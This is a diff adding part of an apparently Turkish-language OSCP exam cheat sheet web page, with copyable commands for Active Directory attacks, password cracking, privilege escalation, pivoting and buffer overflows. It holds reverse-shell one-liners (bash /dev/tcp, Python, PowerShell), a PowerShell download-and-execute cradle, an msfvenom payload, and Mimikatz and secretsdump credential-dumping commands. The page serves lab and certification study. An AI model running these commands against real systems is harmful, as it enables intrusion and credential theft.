+
+    <!-- ==================== ACTIVE DIRECTORY ==================== -->
+    <div class="section" id="ad" data-category="ad">
+      <div class="section-header"><h2>🏛️ Active Directory</h2><span class="section-badge" style="background:var(--accent-purple);color:#000;">22 tools</span></div>
+      <div class="info-box"><h4>📌 OSCP AD Attack Vectors</h4><p>Kerberoasting | AS-REP Roast | Pass the Hash | Pass the Ticket | DCSync | ACL Abuse | GPO Abuse | PrintNightmare | ZeroLogon | Shadow Credentials | RBCD | S4U2Self Abuse</p></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="bloodhound">
+          <div class="tool-header"><h3><span class="tool-icon">🩸</span> BloodHound</h3><div class="tool-purpose">AD saldırı yollarını görselleştirme — OSCP için kritik</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🪟 Windows collector (SharpHound) - AD verisini topla</div><div class="code-block"><pre><code>SharpHound.exe -c All --outputdirectory C:\Temp</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🐧 Linux collector (BloodHound-Python)</div><div class="code-block"><pre><code>bloodhound-python -u user -p pass -ns 10.10.10.1 -d domain.local -c All</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🗄️ Neo4j veritabanını başlat - BloodHound backend</div><div class="code-block"><pre><code>sudo neo4j console</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="impacket">
+          <div class="tool-header"><h3><span class="tool-icon">📦</span> Impacket</h3><div class="tool-purpose">Python AD exploitation toolkit — En kapsamlı araç seti</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🗝️ secretsdump - NTDS.dit ve hash dump</div><div class="code-block"><pre><code>impacket-secretsdump domain/user:pass@10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎯 GetUserSPNs - Kerberoast attack</div><div class="code-block"><pre><code>impacket-GetUserSPNs domain/user:pass@10.10.10.1 -request</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🖥️ PsExec - Uzaktan komut çalıştırma</div><div class="code-block"><pre><code>impacket-psexec domain/user:pass@10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🌟 GetNPUsers - AS-REP Roast attack</div><div class="code-block"><pre><code>impacket-GetNPUsers domain.local/ -dc-ip 10.10.10.1 -no-pass -usersfile users.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="kerbrute">
+          <div class="tool-header"><h3><span class="tool-icon">🔑</span> Kerbrute</h3><div class="tool-purpose">Kerberos brute force & user enumeration</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">👤 User enumeration - Aktif AD kullanıcılarını bul</div><div class="code-block"><pre><code>kerbrute userenum -d domain.local --dc 10.10.10.1 users.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💧 Password spraying - Tek şifre ile çoklu kullanıcı dene</div><div class="code-block"><pre><code>kerbrute passwordspray -d domain.local users.txt "Password123"</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="rubeus">
+          <div class="tool-header"><h3><span class="tool-icon">👑</span> Rubeus</h3><div class="tool-purpose">Kerberos exploitation toolkit (Windows)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🎯 Kerberoast - Service account hash'lerini al</div><div class="code-block"><pre><code>.\Rubeus.exe kerberoast /outfile:hashes.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🌟 AS-REP Roast - Pre-auth olmayan kullanıcıları hedefle</div><div class="code-block"><pre><code>.\Rubeus.exe asreproast /outfile:hashes.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎫 Pass the Ticket - Ticket ile kimlik doğrulama</div><div class="code-block"><pre><code>.\Rubeus.exe ptt /ticket:ticket.kirbi</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="mimikatz">
+          <div class="tool-header"><h3><span class="tool-icon">🗝️</span> Mimikatz</h3><div class="tool-purpose">Windows credential dumping ve pass-the-hash</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔓 Debug privilege al - Gerekli izni al</div><div class="code-block"><pre><code>privilege::debug</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔑 Bellekteki şifreleri göster - Çalışan oturumların şifreleri</div><div class="code-block"><pre><code>sekurlsa::logonpasswords</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💿 SAM hash'lerini dump et</div><div class="code-block"><pre><code>lsadump::sam</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔄 DCSync attack - DC'den hash senkronizasyonu</div><div class="code-block"><pre><code>lsadump::dcsync /user:krbtgt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== PASSWORDS ==================== -->
+    <div class="section" id="passwords" data-category="passwords">
+      <div class="section-header"><h2>🔐 Passwords & Cracking</h2><span class="section-badge" style="background:var(--accent-red);color:#000;">18 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="hashcat">
+          <div class="tool-header"><h3><span class="tool-icon">⚡</span> Hashcat</h3><div class="tool-purpose">GPU ile hızlı hash kırma — Dünyanın en hızlı kırıcısı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔢 MD5 kırma (mode 0)</div><div class="code-block"><pre><code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🪟 NTLM kırma (mode 1000) - Windows hash'leri</div><div class="code-block"><pre><code>hashcat -m 1000 hash.txt rockyou.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🌐 NetNTLMv2 kırma (mode 5600) - SMB relay hash'leri</div><div class="code-block"><pre><code>hashcat -m 5600 hash.txt rockyou.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">👑 Kerberoast (mode 13100)</div><div class="code-block"><pre><code>hashcat -m 13100 hash.txt rockyou.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="john">
+          <div class="tool-header"><h3><span class="tool-icon">🔨</span> John the Ripper</h3><div class="tool-purpose">CPU ile hash kırma — Hashcat alternatifi</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📖 Wordlist ile kırma</div><div class="code-block"><pre><code>john --wordlist=rockyou.txt hash.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">✨ Rules ile kırma - Daha fazla varyasyon</div><div class="code-block"><pre><code>john --rules --wordlist=rockyou.txt hash.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="hydra">
+          <div class="tool-header"><h3><span class="tool-icon">💧</span> Hydra</h3><div class="tool-purpose">Online brute force aracı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔐 SSH brute force</div><div class="code-block"><pre><code>hydra -l admin -P rockyou.txt ssh://10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🌐 Web login brute force (POST form)</div><div class="code-block"><pre><code>hydra -L users.txt -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=error"</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="cewl">
+          <div class="tool-header"><h3><span class="tool-icon">🕸️</span> CeWL</h3><div class="tool-purpose">Web sitesinden özel wordlist oluşturma</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">📝 Site kelimelerinden wordlist oluştur</div><div class="code-block"><pre><code>cewl http://hedef.com -m 6 -w custom.txt</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== LINUX PRIVESC ==================== -->
+    <div class="section" id="linux" data-category="linux">
+      <div class="section-header"><h2>🐧 Linux Privilege Escalation</h2><span class="section-badge" style="background:var(--accent-orange);color:#000;">16 tools</span></div>
+      <div class="info-box"><h4>📌 Linux PrivEsc Vectors</h4><p>SUID/SGID | Sudo misconfig | Capabilities | Cron jobs | Writable files | Kernel exploits | PATH hijacking | Docker/LXD escape | NFS root squashing | LD_PRELOAD</p></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="linpeas">
+          <div class="tool-header"><h3><span class="tool-icon">🐚</span> LinPEAS</h3><div class="tool-purpose">Otomatik Linux privilege escalation enumeration</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📥 İndir ve çalıştır</div><div class="code-block"><pre><code>wget https://github.com/carlospolop/PEASS-ng/releases/download/20241215/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="pspy">
+          <div class="tool-header"><h3><span class="tool-icon">👁️</span> pspy</h3><div class="tool-purpose">Process monitoring (cron job ve komut tespiti)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📥 İndir ve çalıştır</div><div class="code-block"><pre><code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64 -pf -i 1000</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="linenum">
+          <div class="tool-header"><h3><span class="tool-icon">🔢</span> LinEnum</h3><div class="tool-purpose">Klasik Linux enumeration scripti</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">📥 İndir ve çalıştır</div><div class="code-block"><pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+./LinEnum.sh -t</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+        <div class="tool" data-name="linux-exploit-suggester">
+          <div class="tool-header"><h3><span class="tool-icon">💣</span> Linux Exploit Suggester</h3><div class="tool-purpose">Kernel exploit önerileri</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">📥 Kernel exploit bul</div><div class="code-block"><pre><code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+./linux-exploit-suggester.sh</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== WINDOWS PRIVESC ==================== -->
+    <div class="section" id="windows" data-category="windows">
+      <div class="section-header"><h2>🪟 Windows Privilege Escalation</h2><span class="section-badge" style="background:#00a8ff;color:#000;">14 tools</span></div>
+      <div class="info-box"><h4>📌 Windows PrivEsc Vectors</h4><p>Potato attacks (Juicy, Sweet, Rogue) | Unquoted service paths | Insecure service permissions | AlwaysInstallElevated | Registry autoruns | DLL hijacking | Token impersonation | Kernel exploits</p></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="winpeas">
+          <div class="tool-header"><h3><span class="tool-icon">🪟</span> WinPEAS</h3><div class="tool-purpose">Otomatik Windows privilege escalation</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📁 Executable versiyonu</div><div class="code-block"><pre><code>.\winpeas.exe</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📜 PowerShell ile indir ve çalıştır</div><div class="code-block"><pre><code>iex (New-Object Net.WebClient).DownloadString('http://10.10.14.1/winpeas.ps1')</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="powerup">
+          <div class="tool-header"><h3><span class="tool-icon">⚡</span> PowerUp</h3><div class="tool-purpose">Misconfiguration exploitation</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔍 Tüm zafiyetleri kontrol et</div><div class="code-block"><pre><code>Import-Module .\PowerUp.ps1; Invoke-AllChecks</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">⚙️ Service binary exploit - Yazılabilir servis binary'si</div><div class="code-block"><pre><code>Install-ServiceBinary -ServiceName vuln_service</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="potatoes">
+          <div class="tool-header"><h3><span class="tool-icon">🥔</span> Potato Attacks</h3><div class="tool-purpose">Token impersonation ile yetki yükseltme</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🥔 JuicyPotato (Windows 2016 ve altı)</div><div class="code-block"><pre><code>JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🍠 SweetPotato (Windows 2019+)</div><div class="code-block"><pre><code>SweetPotato.exe -p whoami</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== PIVOTING ==================== -->
+    <div class="section" id="pivot" data-category="pivot">
+      <div class="section-header"><h2>🔄 Pivoting & Tunneling</h2><span class="section-badge" style="background:#f472b6;color:#000;">12 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="ligolo-ng">
+          <div class="tool-header"><h3><span class="tool-icon">🕸️</span> Ligolo-ng</h3><div class="tool-purpose">TUN interface ile transparent pivoting — OSCP için en iyisi</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🎮 Attacker (Kali) - Proxy server başlat</div><div class="code-block"><pre><code>sudo ip tuntap add dev ligolo mode tun
+sudo ip link set ligolo up
+sudo ligolo-proxy -selfcert -laddr 0.0.0.0:9999</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🖥️ Victim (Pivot noktası) - Agent bağlan</div><div class="code-block"><pre><code>./agent -connect 10.10.14.1:9999 -ignore-cert</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="chisel">
+          <div class="tool-header"><h3><span class="tool-icon">⛏️</span> Chisel</h3><div class="tool-purpose">SOCKS5 proxy ile tunneling</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🎮 Attacker - Server başlat</div><div class="code-block"><pre><code>chisel server -p 8000 --reverse</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🖥️ Victim - Client bağlan</div><div class="code-block"><pre><code>chisel client 10.10.14.1:8000 R:socks</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="proxychains">
+          <div class="tool-header"><h3><span class="tool-icon">🔗</span> ProxyChains</h3><div class="tool-purpose">SOCKS üzerinden araçları yönlendirme</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">⚙️ Config dosyasını düzenle</div><div class="code-block"><pre><code># /etc/proxychains4.conf: socks5 127.0.0.1 1080</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔍 Nmap ile iç ağ taraması</div><div class="code-block"><pre><code>proxychains nmap -sT -Pn 10.0.1.0/24</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="ssh-tunneling">
+          <div class="tool-header"><h3><span class="tool-icon">🔐</span> SSH Tunneling</h3><div class="tool-purpose">Local/Remote port forwarding ile tunneling</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📡 Local port forwarding - Kali'den iç ağa</div><div class="code-block"><pre><code>ssh -L 8080:target:80 user@jumpbox</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📤 Remote port forwarding - İç ağdan Kali'ye</div><div class="code-block"><pre><code>ssh -R 4444:localhost:4444 kali@10.10.14.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SHELLS ==================== -->
+    <div class="section" id="shells" data-category="shells">
+      <div class="section-header"><h2>🐚 Reverse Shells & Stabilization</h2><span class="section-badge" style="background:#10b981;color:#000;">15 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="revshell-generator">
+          <div class="tool-header"><h3><span class="tool-icon">📡</span> Reverse Shell One-Liners</h3><div class="tool-purpose">Hızlı shell almak için hazır komutlar</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🐧 Bash reverse shell</div><div class="code-block"><pre><code>bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🐍 Python reverse shell</div><div class="code-block"><pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🪟 PowerShell reverse shell</div><div class="code-block"><pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="stty">
+          <div class="tool-header"><h3><span class="tool-icon">🖥️</span> PTY Stabilization</h3><div class="tool-purpose">Tam interaktif shell (tab completion, history, Ctrl+C)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🐍 Python PTY spawn</div><div class="code-block"><pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">⌨️ STTY stabilization (Shell aldıktan sonra CTRL+Z yap)</div><div class="code-block"><pre><code>stty raw -echo; fg
+export TERM=xterm
+stty rows 50 cols 150</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== BUFFER OVERFLOW ==================== -->
+    <div class="section" id="bof" data-category="bof">
+      <div class="section-header"><h2>💥 Buffer Overflow (OSCP BoF)</h2><span class="section-badge" style="background:#ff6b6b;color:#000;">10 tools</span></div>
+      <div class="info-box"><h4>📌 OSCP BoF 7 Adım Metodolojisi</h4><p>1. Fuzzing → 2. Crash Replication → 3. EIP Offset → 4. Control EIP → 5. Bad Characters → 6. Find JMP ESP → 7. Exploit + Shellcode</p></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="mona">
+          <div class="tool-header"><h3><span class="tool-icon">🧪</span> Mona.py</h3><div class="tool-purpose">Immunity Debugger için BoF yardımcısı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">⚙️ Working directory ayarla</div><div class="code-block"><pre><code>!mona config -set workingfolder C:\logs</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎯 EIP offset bulma</div><div class="code-block"><pre><code>!mona findmsp -distance 3000</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🚫 Bad character tespiti</div><div class="code-block"><pre><code>!mona bytearray -b "\x00\x0a\x0d"
+!mona compare -f C:\logs\bytearray.bin -a ESP_address</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="msfvenom">
+          <div class="tool-header"><h3><span class="tool-icon">💣</span> msfvenom</h3><div class="tool-purpose">Shellcode ve payload oluşturma</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🎯 Windows reverse shell payload</div><div class="code-block"><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v shellcode</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== CLOUD ==================== -->
+    <div class="section" id="cloud" data-category="cloud">
+      <div class="section-header"><h2>☁️ Cloud Pentesting</h2><span class="section-badge" style="background:#1f8a4c;color:#000;">10 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="awscli">
+          <div class="tool-header"><h3><span class="tool-icon">☁️</span> AWS CLI</h3><div class="tool-purpose">AWS enumeration ve exploitation</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔑 Kimlik doğrulama</div><div class="code-block"><pre><code>aws configure</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🪣 S3 bucket listeleme</div><div class="code-block"><pre><code>aws s3 ls</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== FORENSICS ==================== -->
+    <div class="section" id="forensics" data-category="forensics">
+      <div class="section-header"><h2>🔬 Forensics & OSINT</h2><span class="section-badge" style="background:#be5e00;color:#000;">8 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="exiftool">
+          <div class="tool-header"><h3><span class="tool-icon">🏷️</span> ExifTool</h3><div class="tool-purpose">Dosya metadata okuma</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">📸 Resim/Görüntü metadata</div><div class="code-block"><pre><code>exiftool image.jpg</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+        <div class="tool" data-name="binwalk">
+          <div class="tool-header"><h3><span class="tool-icon">📦</span> Binwalk</h3><div class="tool-purpose">Binary içinde gizli dosya analizi</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">🔍 Embedded dosyaları bul</div><div class="code-block"><pre><code>binwalk -e dosya.bin</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== REPORTING ==================== -->
+    <div class="section" id="reporting" data-category="reporting">
+      <div class="section-header"><h2>📄 OSCP Reporting</h2><span class="section-badge" style="background:#6b7280;color:#000;">8 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="osert">
+          <div class="tool-header"><h3><span class="tool-icon">📝</span> OSERT Template</h3><div class="tool-purpose">whoisflynn v3.2 OSCP rapor şablonu</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📥 Şablonu indir</div><div class="code-block"><pre><code>git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📄 PDF oluştur (Pandoc ile)</div><div class="code-block"><pre><code>pandoc report.md -o OSCP-OS-XXXXX-Exam-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --number-sections</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Methodology Summary -->
+    <div class="methodology-card">
+      <h3>📋 OSCP Sınav Metodolojisi — 7 Adım</h3>
+      <ul class="methodology-steps">
+        <li>1. External Recon (OSINT)</li>
+        <li>2. Port Scanning (Rustscan + Nmap)</li>
+        <li>3. Service Enumeration (NetExec, enum4linux, gobuster)</li>
+        <li>4. Vulnerability Research (Searchsploit, CVE DB)</li>
+        <li>5. Initial Access (Exploit, brute force, web shell)</li>
+        <li>6. Privilege Escalation (LinPEAS/WinPEAS + manual)</li>
+        <li>7. Lateral Movement / AD (BloodHound, Impacket)</li>
+      </ul>
+      <div class="info-box" style="margin-top:20px;">
+        <h4>💡 OSCP İpuçları</h4>
+        <p>• her zaman local.txt ve proof.txt kanıtlarını screen al ve yedekle<br>
+        • Enumeration her şeydir — atlama, derinlemesine yap<br>
+        • BoF için 30 dakikadan fazla harcama, takılırsan diğer makinelere geç<br>
+        • Metasploit sadece 1 makine için kullan (sınırlı)<br>
+        • AD setinde BloodHound ile haritayı çıkar, en kısa yolu bul<br>
+        • Raporlamayı sınav anında yap, unutma</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// Tool sayacı
+document.getElementById('toolCount').innerText = document.querySelectorAll('.tool').length;
+
+// Kopyalama butonları
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const codeBlock = btn.previousElementSibling;
+    const code = codeBlock.innerText;
+    navigator.clipboard.writeText(code).then(() => {
+      const originalText = btn.innerText;
+      btn.innerText = '✓';
+      setTimeout(() => btn.innerText = originalText, 1500);
+    });
+  });
+});
+
+// Gelişmiş arama
+const searchInput = document.getElementById('searchInput');
+const allTools = document.querySelectorAll('.tool');
+const sections = document.querySelectorAll('.section');
+
+function searchTools() {
+  const query = searchInput.value.toLowerCase().trim();
+  
+  allTools.forEach(tool => {
+    const toolName = tool.getAttribute('data-name') || '';
+    const headerText = tool.querySelector('.tool-header')?.innerText.toLowerCase() || '';
+    const descText = tool.querySelectorAll('.command-desc');
+    let descMatch = false;
+    descText.forEach(d => { if(d.innerText.toLowerCase().includes(query)) descMatch = true; });
+    const codeText = tool.querySelectorAll('.code-block pre');
+    let codeMatch = false;
+    codeText.forEach(c => { if(c.innerText.toLowerCase().includes(query)) codeMatch = true; });
+    
+    const matches = query === '' || 
+                    toolName.includes(query) || 
+                    headerText.includes(query) ||
+                    descMatch ||
+                    codeMatch;
+    
+    tool.style.display = matches ? 'block' : 'none';
+  });
+
+  sections.forEach(section => {
+    const toolsInSection = section.querySelectorAll('.tool');
+    const hasVisible = Array.from(toolsInSection).some(tool => tool.style.display !== 'none');
+    if (query !== '' && !hasVisible && section.id !== 'statsBar') {
+      section.style.display = 'none';
+    } else {
+      section.style.display = 'block';
+    }
+  });
+}
+
+searchInput.addEventListener('keyup', searchTools);
+
+// Smooth scroll
+document.querySelectorAll('.category-link').forEach(link => {
+  link.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = link.getAttribute('href').substring(1);
+    const target = document.getElementById(targetId);
+    if (target) target.scrollIntoView({ behavior: 'smooth' });
+  });
+});
+</script>
+</body>
+</html>
